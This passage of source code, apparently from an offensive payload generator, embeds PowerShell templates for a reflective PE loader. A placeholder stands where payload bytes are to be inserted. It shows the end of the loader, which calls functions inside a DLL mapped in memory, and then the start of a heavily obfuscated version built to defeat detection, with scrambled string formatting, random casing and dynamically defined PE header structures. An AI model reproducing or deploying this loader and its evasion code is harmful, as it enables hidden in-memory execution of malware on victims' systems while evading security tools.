            elseif (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -ne [IntPtr]::Zero)) {
# LYRICS1117
                $VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
# LYRICS1118
                if (($VAR0301 -eq $null) -or ($VAR0301 -eq [IntPtr]::Zero)) {
# LYRICS1119
                    Throw "ERROR71"
                }
# LYRICS1120
                $VAR0301 = FUN004 $VAR0301 $VAR0263
# LYRICS1121
                $VAR0301 = FUN005 $VAR0301 $VAR0292
# LYRICS1122
# LYRICS1123
# LYRICS1124
                $Null = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
            }
# LYRICS1125
# LYRICS1126
# LYRICS1127
            if ($VAR0161 -eq [IntPtr]::Zero -and $VAR0126.CONST037 -ieq "Library") {
# LYRICS1128
                FUN029 -VAR0263 $VAR0263
            }
            else {
# LYRICS1129
# LYRICS1130
                $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
# LYRICS1131
            }
# LYRICS1132
        }
# LYRICS1133
        FUN030
    }
# LYRICS1134
# LYRICS1135
    Function FUN030 {
# LYRICS1136
# LYRICS1137
# LYRICS1138
        if (-not $VAR008) {
# LYRICS1139
# LYRICS1140
            $VAR001[0] = 0
# LYRICS1141
            $VAR001[1] = 0
        }
# LYRICS1142
# LYRICS1143
        if ($VAR004 -ne $null -and $VAR004 -ne '') {
# LYRICS1144
            $VAR004 = "VAR0305 $VAR004"
        }
        else {
            $VAR004 = "VAR0305"
        }
# LYRICS1145
        if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
# LYRICS1146
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004)
# LYRICS1147
        }
        else {
# LYRICS1148
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
# LYRICS1149
        }
    }
# LYRICS1150
    FUN030
}



$Bytes = QWERQWERQWER
FUN000 -VAR001 $Bytes

"""


let PowershellObfsTemplate * = """

 SET-varIABle  ("7ov"+"ix") (  [tyPe]("{6}{7}{1}{9}{3}{0}{10}{5}{8}{2}{4}"-F 'IcES','.IN','u','opSeRV','tE','al','sYsTEm.ru','nTiME','ASAttriB','Ter','.MARsH')  )  ;   $dtwM  = [tYPe]("{8}{3}{4}{2}{5}{1}{0}{6}{7}"-f 'Ic','oPSERV','IME.InT','ysTE','M.RuNt','ER','Es.uNmAn','AGeDTypE','s') ;  sv  ('T'+'Kd9')  ([tyPe]("{0}{1}" -F'InT','32'));   $WmbNg=[tyPe]("{1}{0}" -f'ol','bO') ;  seT  ('5T'+'7l') ([TyPE]("{1}{0}{2}"-F'N','Ui','T32')  );  $ns87 = [TYpe]("{2}{1}{0}"-F'r','eRTe','BiTConv'); $sw0  =  [typE]("{7}{8}{0}{10}{4}{3}{6}{5}{2}{9}{1}" -f 't','CcesS','U','flECTIon.em','E','MblyB','it.aSse','S','yS','IlDEra','EM.R') ;   Set-ITEM  ('VAr'+'IABle:j1'+'F'+'Vc')  ([TyPe]("{1}{6}{3}{5}{0}{4}{2}" -f'On.calLIN','S','ENTIoNS','teM.REfle','GCONv','cti','ys') ) ; $vbU= [tyPe]("{2}{0}{3}{1}"-f 'dO','n','aPP','MaI') ;set-ITem ('VAr'+'IaBl'+'e:Z5gH'+'r')  (  [type]("{2}{0}{1}"-f 'VIrOnMEN','T','EN')  )  ;  $oi4 = [typE]("{2}{0}{1}" -F 'inTpt','r','U');  $3x78  = [tyPe]("{1}{0}"-f'h','mat')  ;   $rt8 =[tYpe]("{1}{10}{3}{5}{8}{9}{4}{6}{2}{0}{7}" -F'eS','S','iC','eM','.iNTero','.RU','pSERV','.MaRSHaL','Nt','Ime','YSt');   sV  ('Lxq'+'4') ([TYPe]("{1}{0}{2}"-f 't','INtp','R')); function F`U`N000 {

    [CmdletBinding()]
    Param(
        [Parameter(POSItIOn = 0, MAndatORY = $true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $VAR001,

        [Parameter(POsiTioN = 1)]
        [String[]]
        $VAR002,

        [Parameter(poSITION = 2)]
        [ValidateSet( {"{0}{1}{2}"-f 'Wide','S','tr'}, 'Str', {"{0}{2}{1}"-f 'NoOu','put','t'}, {"{1}{0}{2}{3}" -f 'Se','Default','tting','s'} )]
        [String]
        $VAR003 = ("{1}{0}{2}"-f'tSett','Defaul','ings'),

        [Parameter(pOSItioN = 3)]
        [String]
        $VAR004,

        [Parameter(poSItIOn = 4)]
        [Int32]
        $VAR005,

        [Parameter(POSiTIon = 5)]
        [String]
        $VAR006,

        [Switch]
        $VAR007,

        [Switch]
        $VAR008
    )

    Set-StrictMode -Version 2


    $VAR009 = {
        [CmdletBinding()]
        Param(
            [Parameter(pOsItion = 0, MAndatory = $true)]
            [Byte[]]
            $VAR001,

            [Parameter(POsiTIoN = 1, maNDatoRy = $true)]
            [String]
            $VAR003,

            [Parameter(posITiOn = 2, mandaTorY = $true)]
            [Int32]
            $VAR005,

            [Parameter(POSitiOn = 3, MANDatoRY = $true)]
            [String]
            $VAR006,

            [Parameter(POsITIoN = 4, mandaToRy = $true)]
            [Bool]
            $VAR007,

            [Parameter(POsiTIoN = 5, ManDATory = $true)]
            [String]
            $VAR004
        )
    
        
      
        
        Function FUn001 {
            $VAR010 = New-Object ('System'+'.Ob'+'jec'+'t')

            
            
            $Domain =   $vbu::CUrReNtDOmaIn
            $VAR012 = New-Object ('S'+'ystem.R'+'ef'+'le'+'ctio'+'n'+'.A'+'ssembly'+'Name')(("{1}{0}{3}{2}"-f 'namic','Dy','ly','Assemb'))
            $VAR013 = $Domain.deFINeDynAMICaSSEmBLY($VAR012,   (  Get-VarIaBlE  ("s"+"w0") -vAl  )::RUN)
            $VAR014 = $VAR013.DefInEDynaMIcmODule(("{1}{2}{0}"-f'ule','Dyna','micMod'), $false)
            $VAR015 =   (  chilDiteM ('V'+'ar'+'iABlE'+':7oviX') ).vaLue.GeTconstruCTOrs()[0]


            
            
            $VAR011 = $VAR014.DEfiNeEnuM(("{0}{1}{2}" -f 'Machin','eTyp','e'), ("{2}{0}{1}" -f'li','c','Pub'), [UInt16])
            $VAR011.DeFiNELiTEraL(("{0}{1}" -f'Nati','ve'), [UInt16] 0) | Out-Null
            $VAR011.dEfINeLITERAL(("{2}{1}{0}"-f'9','08','CONST'), [UInt16] 0x014c) | Out-Null
            $VAR011.defINEliTERAl(("{2}{1}{0}" -f'0','9','CONST0'), [UInt16] 0x0200) | Out-Null
            $VAR011.dEFinEliTErAl(("{2}{0}{1}" -f'N','ST091','CO'), [UInt16] 0x8664) | Out-Null
            $VAR016 = $VAR011.cReATetype()
            $VAR010 | Add-Member -MemberType ('No'+'tePr'+'opert'+'y') -Name ('Machine'+'Ty'+'p'+'e') -Value $VAR016

            
            $VAR011 = $VAR014.dEfInEeNuM(("{1}{2}{0}" -f'pe','Magi','cTy'), ("{1}{0}"-f'lic','Pub'), [UInt16])
            $VAR011.dEfINELiteRAL(("{1}{0}{2}"-f 'ONST1','C','00'), [UInt16] 0x10b) | Out-Null
            $VAR011.DEfINElITErAL(("{2}{1}{0}"-f '01','1','CONST'), [UInt16] 0x20b) | Out-Null
            $VAR021 = $VAR011.cReATETYpE()
            $VAR010 | Add-Member -MemberType ('N'+'ot'+'eProper'+'ty') -Name ('M'+'agicT'+'ype') -Value $VAR021

            
            $VAR011 = $VAR014.dEFinEeNUM(("{0}{2}{3}{1}"-f'CONST0','e','4','7Typ'), ("{0}{1}"-f 'Publi','c'), [UInt16])
            $VAR011.DEfineLIteraL(("{0}{1}" -f'CO','NST102'), [UInt16] 0) | Out-Null
            $VAR011.DEFInELiTeRAL(("{0}{1}{2}"-f 'CON','S','T103'), [UInt16] 1) | Out-Null
            $VAR011.dEfiNElIteRaL(("{0}{1}"-f 'CONST1','04'), [UInt16] 2) | Out-Null
            $VAR011.DefiNELiTeRal(("{1}{0}{2}" -f 'O','C','NST099'), [UInt16] 3) | Out-Null
            $VAR011.defIneLiTeRAL(("{1}{2}{0}"-f 'T098','CON','S'), [UInt16] 7) | Out-Null
            $VAR011.dEFiNelITEral(("{0}{1}"-f 'C','ONST097'), [UInt16] 9) | Out-Null
            $VAR011.DEFinELItERAL(("{1}{2}{0}" -f'96','CONS','T0'), [UInt16] 10) | Out-Null
            $VAR011.DeFiNelIteRal(("{2}{0}{1}" -f 'ST09','5','CON'), [UInt16] 11) | Out-Null
            $VAR011.deFiNeliteraL(("{0}{1}{2}" -f 'CON','ST','094'), [UInt16] 12) | Out-Null
            $VAR011.dEFIneLITeRaL(("{0}{1}"-f 'CONST0','93'), [UInt16] 13) | Out-Null
            $VAR011.DEFinELIterAl(("{1}{0}{2}" -f 'ST09','CON','2'), [UInt16] 14) | Out-Null
            $VAR017 = $VAR011.CREaTEtYPe()
            $VAR010 | Add-Member -MemberType ('NotePr'+'opert'+'y') -Name ('CONST047'+'T'+'yp'+'e') -Value $VAR017

            
            $VAR011 = $VAR014.deFIneEnuM(("{0}{2}{1}{3}"-f'C','ST','ON','035Type'), ("{1}{0}" -f'c','Publi'), [UInt16])
            $VAR011.DEfInelITERAL(("{2}{0}{1}" -f 'T0','80','CONS'), [UInt16] 0x0001) | Out-Null
            $VAR011.dEFINelItErAl(("{0}{1}"-f'CON','ST079'), [UInt16] 0x0002) | Out-Null
            $VAR011.defINELIteRaL(("{0}{1}{2}"-f 'CO','N','ST078'), [UInt16] 0x0004) | Out-Null
            $VAR011.DeFiNElIteral(("{2}{1}{0}" -f '7','NST07','CO'), [UInt16] 0x0008) | Out-Null
            $VAR011.DEFINELIterAl(("{2}{0}{1}" -f 'NST','088','CO'), [UInt16] 0x0040) | Out-Null
            $VAR011.DEfiNeLItEraL(("{0}{1}{2}"-f 'C','ONS','T087'), [UInt16] 0x0080) | Out-Null
            $VAR011.DEFineliTeRaL(("{0}{1}{2}" -f'CONS','T0','86'), [UInt16] 0x0100) | Out-Null
            $VAR011.DEfinelIterAl(("{1}{0}{2}"-f'ST08','CON','5'), [UInt16] 0x0200) | Out-Null
            $VAR011.DefInelItErAL(("{2}{0}{1}"-f'ONST0','84','C'), [UInt16] 0x0400) | Out-Null
            $VAR011.defiNEliTERAL(("{0}{1}" -f 'CONST0','83'), [UInt16] 0x0800) | Out-Null
            $VAR011.dEFiNeliTERal(("{0}{1}{2}" -f 'CON','ST07','6'), [UInt16] 0x1000) | Out-Null
            $VAR011.DefinELIteral(("{0}{2}{1}"-f'C','ST082','ON'), [UInt16] 0x2000) | Out-Null
            $VAR011.DEfinelitERAl(("{0}{1}{2}"-f'CO','NST0','81'), [UInt16] 0x8000) | Out-Null
            $VAR018 = $VAR011.CReATETyPe()
            $VAR010 | Add-Member -MemberType ('No'+'teProp'+'erty') -Name ('CONST0'+'35'+'Typ'+'e') -Value $VAR018

            
            
            $VAR019 = ("{4}{12}{11}{9}{13}{15}{8}{6}{2}{7}{5}{3}{0}{1}{10}{14}"-f', Se','aled, BeforeFi',', Explici','t','Aut','you','ublic','tLa','ass, P','i','eldI','t, Ans','oLayou','Class,','nit',' Cl')
            $VAR011 = $VAR014.DEfiNEtyPe(("{0}{1}"-f 'CONS','T075'), $VAR019, [System.ValueType], 8)
        ($VAR011.DEfINEfiELd(("{0}{2}{1}" -f 'CONST','4','07'), [UInt32], ("{0}{1}"-f 'Publ','ic'))).sEtOFFseT(0) | Out-Null
        ($VAR011.defINEFieLD(("{0}{1}"-f'S','ize'), [UInt32], ("{1}{0}" -f'blic','Pu'))).SeTofFsEt(4) | Out-Null
            $VAR020 = $VAR011.CrEATETyPe()
            $VAR010 | Add-Member -MemberType ('No'+'te'+'Pr'+'operty') -Name ('CONS'+'T075') -Value $VAR020

            
            $VAR019 = ("{8}{3}{17}{11}{13}{14}{7}{5}{9}{4}{6}{10}{18}{12}{16}{2}{15}{1}{0}" -f 'nit','ldI',', BeforeF','L',', Seque',' Pub','nti','ass,','Auto','lic','a','nsiCla','yout, Seal','ss, ','Cl','ie','ed','ayout, A','lLa')
            $VAR011 = $VAR014.DEFIneTyPE(("{1}{0}{2}"-f'T0','CONS','73'), $VAR019, [System.ValueType], 20)
            $VAR011.dEfiNeFIeld(("{0}{1}"-f'Mach','ine'), [UInt16], ("{1}{0}"-f 'ic','Publ')) | Out-Null
            $VAR011.deFINEfIElD(("{1}{2}{0}" -f '72','CON','ST0'), [UInt16], ("{1}{2}{0}" -f'c','Pub','li')) | Out-Null
            $VAR011.definEFIELd(("{1}{0}{2}" -f'NST','CO','071'), [UInt32], ("{2}{1}{0}" -f 'c','ubli','P')) | Out-Null
            $VAR011.DeFiNeFielD(("{1}{0}{2}" -f 'ONST07','C','0'), [UInt32], ("{1}{0}"-f'ic','Publ')) | Out-Null
            $VAR011.dEfINefielD(("{1}{2}{0}" -f'9','CON','ST06'), [UInt32], ("{0}{1}"-f'Publi','c')) | Out-Null
            $VAR011.deFiNeFIELd(("{0}{2}{1}" -f'C','T068','ONS'), [UInt16], ("{1}{0}" -f'c','Publi')) | Out-Null
            $VAR011.deFInefiELD(("{2}{1}{0}"-f'067','ONST','C'), [UInt16], ("{1}{0}"-f 'ic','Publ')) | Out-Null
            $VAR022 = $VAR011.CrEAtetype()
            $VAR010 | Add-Member -MemberType ('Not'+'e'+'Pro'+'perty') -Name ('C'+'ONST'+'073') -Value $VAR022

            
            $VAR019 = ("{7}{2}{3}{6}{4}{10}{5}{0}{8}{11}{9}{1}{12}" -f 'b','aled, BeforeFieldI','utoLay','o',', Clas',' Pu','ut, AnsiClass','A','lic, ExplicitLay',', Se','s,','out','nit')
            $VAR011 = $VAR014.defiNETyPE(("{1}{2}{0}" -f'66','CONS','T0'), $VAR019, [System.ValueType], 240)
        ($VAR011.dEfINEFIelD(("{1}{0}"-f'ic','Mag'), $VAR021, ("{0}{1}"-f 'Pu','blic'))).setOffset(0) | Out-Null
        ($VAR011.DeFinEfIEld(("{1}{2}{0}" -f '5','C','ONST06'), [Byte], ("{1}{0}"-f'ic','Publ'))).SetOFFSet(2) | Out-Null
        ($VAR011.DEFINEFieLD(("{1}{0}{2}"-f 'T0','CONS','64'), [Byte], ("{0}{1}"-f'Publ','ic'))).setoFfSeT(3) | Out-Null
        ($VAR011.DEfiNefiELd(("{1}{2}{0}" -f '63','C','ONST0'), [UInt32], ("{2}{0}{1}"-f'u','blic','P'))).sEToFfSET(4) | Out-Null
        ($VAR011.DefINEFIeLd(("{1}{2}{0}"-f'62','CON','ST0'), [UInt32], ("{1}{0}" -f'ic','Publ'))).SEtOFfSet(8) | Out-Null
        ($VAR011.dEfinefIeLD(("{0}{1}{2}" -f'C','ONS','T061'), [UInt32], ("{0}{1}"-f'Pub','lic'))).setoffSet(12) | Out-Null
        ($VAR011.DEfINEfield(("{0}{1}"-f'CONST','060'), [UInt32], ("{1}{2}{0}"-f 'ic','Pu','bl'))).SeTOFfsET(16) | Out-Null
        ($VAR011.DEfINefiElD(("{1}{2}{0}"-f'059','CO','NST'), [UInt32], ("{1}{0}"-f 'ic','Publ'))).SeTOFFset(20) | Out-Null
        ($VAR011.DefiNefIELd(("{1}{2}{0}"-f '58','CONST','0'), [UInt64], ("{0}{2}{1}"-f'P','blic','u'))).setOfFSEt(24) | Out-Null
        ($VAR011.DeFinefieLd(("{0}{1}" -f'CO','NST057'), [UInt32], ("{2}{1}{0}"-f 'lic','ub','P'))).seTOFfsEt(32) | Out-Null
        ($VAR011.defiNEField(("{0}{1}"-f 'CONS','T056'), [UInt32], ("{1}{0}" -f 'lic','Pub'))).setOFFset(36) | Out-Null
        ($VAR011.deFinEFIeld(("{0}{2}{1}" -f'CO','55','NST0'), [UInt16], ("{2}{0}{1}" -f'u','blic','P'))).SeToFfSEt(40) | Out-Null
        ($VAR011.dEfiNefIeLd(("{1}{0}" -f'054','CONST'), [UInt16], ("{0}{2}{1}"-f'Pu','ic','bl'))).seToFFSet(42) | Out-Null
        ($VAR011.DEFiNEfIEld(("{0}{1}" -f 'C','ONST053'), [UInt16], ("{1}{0}" -f'ic','Publ'))).SETOffSEt(44) | Out-Null
        ($VAR011.definEfiElD(("{2}{0}{1}" -f 'ST','052','CON'), [UInt16], ("{0}{1}" -f'Pub','lic'))).seToFFseT(46) | Out-Null
        ($VAR011.dEfiNEfIELd(("{2}{0}{1}" -f 'ON','ST051','C'), [UInt16], ("{0}{1}"-f'Pu','blic'))).sEToFFsET(48) | Out-Null
        ($VAR011.DefINeFIElD(("{2}{1}{0}" -f'0','ST05','CON'), [UInt16], ("{1}{0}"-f 'lic','Pub'))).sEtoFfSet(50) | Out-Null
        ($VAR011.DeFIneFIelD(("{1}{0}"-f'NST049','CO'), [UInt32], ("{1}{0}"-f 'ublic','P'))).SETofFseT(52) | Out-Null
        ($VAR011.defiNEFieLD(("{1}{2}{0}"-f '33','CONS','T0'), [UInt32], ("{0}{1}" -f'Pub','lic'))).sEtoFfSEt(56) | Out-Null
        ($VAR011.dEFinEFielD(("{0}{1}" -f'CONST0','34'), [UInt32], ("{0}{1}" -f'Publi','c'))).SEToFfSeT(60) | Out-Null
        ($VAR011.DefInefIEld(("{0}{1}"-f 'CO','NST048'), [UInt32], ("{1}{0}" -f 'blic','Pu'))).SetoffsET(64) | Out-Null
        ($VAR011.DEfINeFiEld(("{1}{0}" -f 'T047','CONS'), $VAR017, ("{1}{0}" -f'lic','Pub'))).SetOffset(68) | Out-Null
        ($VAR011.DeFINEfiELd(("{0}{1}{2}" -f 'CO','NST','035'), $VAR018, ("{0}{1}"-f 'Publi','c'))).setofFSeT(70) | Out-Null
        ($VAR011.DeFinEFielD(("{1}{0}{2}" -f '04','CONST','6'), [UInt64], ("{0}{1}"-f 'Pub','lic'))).SetOffSet(72) | Out-Null
        ($VAR011.DefinEfIelD(("{1}{0}" -f'ST045','CON'), [UInt64], ("{1}{0}"-f 'ublic','P'))).SETOFfseT(80) | Out-Null
        ($VAR011.defineFIEld(("{1}{2}{0}" -f '044','CO','NST'), [UInt64], ("{0}{1}"-f'Publ','ic'))).SEToFfsET(88) | Out-Null
        ($VAR011.dEfinEFIeLD(("{1}{0}{2}" -f'ST04','CON','3'), [UInt64], ("{0}{1}"-f'Publi','c'))).setoFfSet(96) | Out-Null
        ($VAR011.dEfIneFieLD(("{0}{1}" -f 'CONST10','5'), [UInt32], ("{0}{1}"-f'Publi','c'))).sETOfFSet(104) | Out-Null
        ($VAR011.dEfiNefIeLD(("{2}{1}{0}"-f'T106','NS','CO'), [UInt32], ("{0}{1}" -f'Publi','c'))).SeTOFFSET(108) | Out-Null
        ($VAR011.DEfinefielD(("{0}{1}{2}" -f'CO','NST1','07'), $VAR020, ("{1}{0}{2}"-f 'bl','Pu','ic'))).setoFfseT(112) | Out-Null
        ($VAR011.DeFInefieLD(("{0}{1}" -f 'C','ONST108'), $VAR020, ("{0}{1}"-f 'P','ublic'))).SeToffset(120) | Out-Null
        ($VAR011.deFinefIELd(("{1}{0}" -f'9','CONST10'), $VAR020, ("{0}{1}" -f'Publi','c'))).seToFFsEt(128) | Out-Null
        ($VAR011.DEfinEFIeld(("{0}{1}"-f'CO','NST110'), $VAR020, ("{1}{0}{2}"-f 'u','P','blic'))).seTOffsEt(136) | Out-Null
        ($VAR011.deFIneFIElD(("{1}{2}{0}"-f'1','CONST1','1'), $VAR020, ("{0}{1}"-f 'Pub','lic'))).seTOFFSeT(144) | Out-Null
        ($VAR011.DEfinEFIElD(("{1}{0}" -f '112','CONST'), $VAR020, ("{0}{1}" -f 'Publ','ic'))).SETOffseT(152) | Out-Null
        ($VAR011.DeFINEfiELD(("{0}{1}"-f 'Debu','g'), $VAR020, ("{1}{0}" -f'lic','Pub'))).sETOffseT(160) | Out-Null
        ($VAR011.DeFINEFIELd(("{0}{1}{2}" -f 'Arch','it','ecture'), $VAR020, ("{1}{0}" -f 'ic','Publ'))).SetOFFSEt(168) | Out-Null
        ($VAR011.dEFInEfield(("{0}{1}"-f'CO','NST113'), $VAR020, ("{1}{0}{2}" -f 'bli','Pu','c'))).sETOfFset(176) | Out-Null
        ($VAR011.DEFinEFiElD(("{1}{2}{0}" -f'ST114','CO','N'), $VAR020, ("{1}{0}"-f'c','Publi'))).SEtoFFseT(184) | Out-Null
        ($VAR011.defiNEFiELd(("{1}{0}"-f 'NST115','CO'), $VAR020, ("{1}{0}" -f'blic','Pu'))).SeToffsEt(192) | Out-Null
        ($VAR011.deFiNeFIELD(("{1}{0}{2}" -f 'ONST1','C','20'), $VAR020, ("{0}{2}{1}"-f'P','lic','ub'))).SETOfFSEt(200) | Out-Null
        ($VAR011.DEFINEfIeLd('IAT', $VAR020, ("{1}{0}" -f 'lic','Pub'))).sETOfFset(208) | Out-Null
        ($VAR011.DEfiNeFiELD(("{2}{1}{0}" -f '6','T11','CONS'), $VAR020, ("{1}{0}"-f'ublic','P'))).sETOFFset(216) | Out-Null
        ($VAR011.dEfineField(("{0}{1}{2}" -f'CO','NS','T117'), $VAR020, ("{1}{0}" -f'blic','Pu'))).SEtofFset(224) | Out-Null
        ($VAR011.DeFiNeFiELd(("{1}{0}"-f'ed','Reserv'), $VAR020, ("{1}{0}"-f 'ublic','P'))).SETOfFseT(232) | Out-Null
            $VAR023 = $VAR011.crEaTeTypE()
            $VAR010 | Add-Member -MemberType ('Note'+'Propert'+'y') -Name ('CO'+'N'+'ST066') -Value $VAR023

            
            $VAR019 = ("{0}{14}{4}{15}{10}{6}{8}{13}{12}{9}{5}{7}{3}{1}{11}{2}" -f 'Auto','t, ','foreFieldInit','u','t, An','c','ss, Class, Pu','itLayo','b','i','Cla','Sealed, Be',', Expl','lic','Layou','si')
            $VAR011 = $VAR014.deFINetYPE(("{2}{1}{0}"-f '18','NST1','CO'), $VAR019, [System.ValueType], 224)
        ($VAR011.DeFiNeFieLd(("{0}{1}"-f'Magi','c'), $VAR021, ("{0}{1}"-f 'Pu','blic'))).sEtoFFSET(0) | Out-Null
        ($VAR011.defINEfIELD(("{1}{2}{0}"-f '5','CONST0','6'), [Byte], ("{0}{1}" -f 'Publi','c'))).SEtOfFseT(2) | Out-Null
        ($VAR011.DeFINEfieLD(("{0}{1}{2}" -f'CONS','T06','4'), [Byte], ("{0}{2}{1}" -f 'Pu','c','bli'))).seToFFSET(3) | Out-Null
        ($VAR011.DeFinEFIEld(("{1}{0}{2}"-f 'S','CON','T063'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).sEtOFFsET(4) | Out-Null
        ($VAR011.dEFinEfIeLd(("{0}{1}{2}" -f 'CONST','0','62'), [UInt32], ("{2}{0}{1}"-f'i','c','Publ'))).SetoFFSeT(8) | Out-Null
        ($VAR011.DefIneFIeld(("{0}{2}{1}" -f 'CO','061','NST'), [UInt32], ("{0}{1}{2}"-f 'P','u','blic'))).sETOFfSEt(12) | Out-Null
        ($VAR011.deFInefIelD(("{1}{0}"-f'060','CONST'), [UInt32], ("{0}{1}" -f 'P','ublic'))).sEtOFfsET(16) | Out-Null
        ($VAR011.dEfiNefIeld(("{0}{1}" -f 'CONST05','9'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).SetoFFSeT(20) | Out-Null
        ($VAR011.dEFiNefieLD(("{2}{0}{1}" -f'ONST1','19','C'), [UInt32], ("{1}{0}"-f'blic','Pu'))).setoFfSet(24) | Out-Null
        ($VAR011.deFINEfiElD(("{1}{0}"-f'ST058','CON'), [UInt32], ("{2}{1}{0}"-f'c','i','Publ'))).setoffSET(28) | Out-Null
        ($VAR011.DeFINefIElD(("{0}{1}" -f'CONST05','7'), [UInt32], ("{1}{0}"-f 'ublic','P'))).sETOFfSeT(32) | Out-Null
        ($VAR011.defIneFIeLd(("{1}{0}"-f'ONST056','C'), [UInt32], ("{1}{0}{2}" -f'ubli','P','c'))).setoFfsEt(36) | Out-Null
        ($VAR011.DEfINEFiEld(("{1}{0}{2}"-f'ST','CON','055'), [UInt16], ("{1}{2}{0}" -f'c','Publ','i'))).SEtoffSET(40) | Out-Null
        ($VAR011.deFinefiELD(("{0}{1}{2}"-f 'CO','N','ST054'), [UInt16], ("{1}{0}"-f 'lic','Pub'))).SeToFFseT(42) | Out-Null
        ($VAR011.DEfiNEFiElD(("{0}{2}{1}"-f'CO','053','NST'), [UInt16], ("{0}{1}"-f'Publi','c'))).SETofFsET(44) | Out-Null
        ($VAR011.defInEFIELD(("{2}{1}{0}" -f'052','ONST','C'), [UInt16], ("{0}{1}{2}"-f 'P','u','blic'))).sETOffsEt(46) | Out-Null
        ($VAR011.DefiNeFiElD(("{2}{0}{1}" -f'ST0','51','CON'), [UInt16], ("{2}{0}{1}"-f'bl','ic','Pu'))).SetOFfsEt(48) | Out-Null
        ($VAR011.DefINefIELD(("{1}{0}" -f '0','CONST05'), [UInt16], ("{1}{0}"-f 'c','Publi'))).SetOFfset(50) | Out-Null
        ($VAR011.deFINEFIelD(("{0}{2}{1}" -f 'CON','49','ST0'), [UInt32], ("{1}{0}" -f 'ublic','P'))).setOffSET(52) | Out-Null
        ($VAR011.defIneFiElD(("{0}{1}"-f 'C','ONST033'), [UInt32], ("{0}{1}" -f 'Publi','c'))).sETOFfSET(56) | Out-Null
        ($VAR011.DefinefiELd(("{1}{0}" -f 'ST034','CON'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).SEtoffsET(60) | Out-Null
        ($VAR011.DeFIneFiElD(("{1}{2}{0}"-f '8','CONS','T04'), [UInt32], ("{0}{1}{2}" -f 'Pu','b','lic'))).SETOffseT(64) | Out-Null
        ($VAR011.DEfiNefIELD(("{2}{1}{0}" -f 'NST047','O','C'), $VAR017, ("{0}{1}"-f'Publi','c'))).sETofFSeT(68) | Out-Null
        ($VAR011.dEFINefieLd(("{2}{0}{1}" -f'03','5','CONST'), $VAR018, ("{1}{2}{0}" -f'c','Publ','i'))).sEtOfFSET(70) | Out-Null
        ($VAR011.dEfIneFiELd(("{0}{1}{2}"-f 'CO','NS','T046'), [UInt32], ("{0}{1}" -f'Publi','c'))).setOfFSEt(72) | Out-Null
        ($VAR011.dEFINeFIELD(("{1}{0}" -f'45','CONST0'), [UInt32], ("{0}{1}"-f'Publi','c'))).setOffSet(76) | Out-Null
        ($VAR011.deFinEfieLd(("{0}{1}"-f'CONS','T044'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).SEtoFFset(80) | Out-Null
        ($VAR011.dEfiNEfIeLD(("{1}{2}{0}"-f '043','C','ONST'), [UInt32], ("{1}{2}{0}" -f 'lic','P','ub'))).setOffSEt(84) | Out-Null
        ($VAR011.DEfInEField(("{1}{0}"-f 'NST105','CO'), [UInt32], ("{1}{2}{0}"-f'ic','Pu','bl'))).SEtofFseT(88) | Out-Null
        ($VAR011.defINefIeld(("{1}{0}" -f'ONST106','C'), [UInt32], ("{0}{1}" -f'Publ','ic'))).SetoffSEt(92) | Out-Null
        ($VAR011.DEfinEFIeld(("{2}{1}{0}"-f '107','T','CONS'), $VAR020, ("{1}{0}"-f 'ic','Publ'))).SEToFFSeT(96) | Out-Null
        ($VAR011.DEfinEFiELD(("{0}{2}{1}" -f 'C','8','ONST10'), $VAR020, ("{0}{1}" -f'Pu','blic'))).setoffSeT(104) | Out-Null
        ($VAR011.DEFinefIeld(("{2}{1}{0}" -f 'T109','ONS','C'), $VAR020, ("{0}{1}"-f 'Pub','lic'))).SeToffSEt(112) | Out-Null
        ($VAR011.dEFINefieLd(("{0}{2}{1}" -f 'CONST','0','11'), $VAR020, ("{0}{1}"-f 'Pub','lic'))).SEtOFfsET(120) | Out-Null
        ($VAR011.DEfInefIElD(("{2}{0}{1}"-f'ONST','111','C'), $VAR020, ("{0}{1}"-f 'Pub','lic'))).seTOffset(128) | Out-Null
        ($VAR011.DEfInEFiElD(("{2}{1}{0}"-f'2','T11','CONS'), $VAR020, ("{0}{1}"-f 'P','ublic'))).sEtoFFSEt(136) | Out-Null
        ($VAR011.DEFiNefiELd(("{1}{0}" -f'ebug','D'), $VAR020, ("{0}{1}" -f 'Pu','blic'))).setoffset(144) | Out-Null
        ($VAR011.DeFineFiELD(("{1}{2}{0}"-f'e','Architec','tur'), $VAR020, ("{1}{0}"-f 'c','Publi'))).SeToffSET(152) | Out-Null
        ($VAR011.DefiNEFIelD(("{1}{2}{0}" -f '113','CONS','T'), $VAR020, ("{0}{1}"-f'Pub','lic'))).sEToffset(160) | Out-Null
        ($VAR011.deFiNefIeld(("{2}{1}{0}" -f '4','ONST11','C'), $VAR020, ("{0}{1}"-f 'Publ','ic'))).seTofFseT(168) | Out-Null
        ($VAR011.DeFINEFIELD(("{1}{2}{0}" -f 'NST115','C','O'), $VAR020, ("{0}{1}" -f'Publ','ic'))).SETofFseT(176) | Out-Null
        ($VAR011.DeFInEfIelD(("{0}{1}{2}"-f'C','ONST','120'), $VAR020, ("{0}{1}"-f 'Pub','lic'))).SEtoffSet(184) | Out-Null
        ($VAR011.DefineFIEld('IAT', $VAR020, ("{1}{0}" -f 'blic','Pu'))).sEtoFFSEt(192) | Out-Null
        ($VAR011.dEfineFIEld(("{0}{1}{2}"-f 'CONS','T','116'), $VAR020, ("{0}{1}{2}" -f'Pub','l','ic'))).SEtOffsEt(200) | Out-Null
        ($VAR011.defINeFieLd(("{0}{2}{1}" -f'C','T117','ONS'), $VAR020, ("{1}{0}" -f'c','Publi'))).SEToFfSeT(208) | Out-Null
        ($VAR011.DeFInEFIELd(("{1}{2}{0}" -f 'rved','Re','se'), $VAR020, ("{0}{1}"-f'Publi','c'))).sEToFfSEt(216) | Out-Null
            $VAR024 = $VAR011.creAtEtYPE()
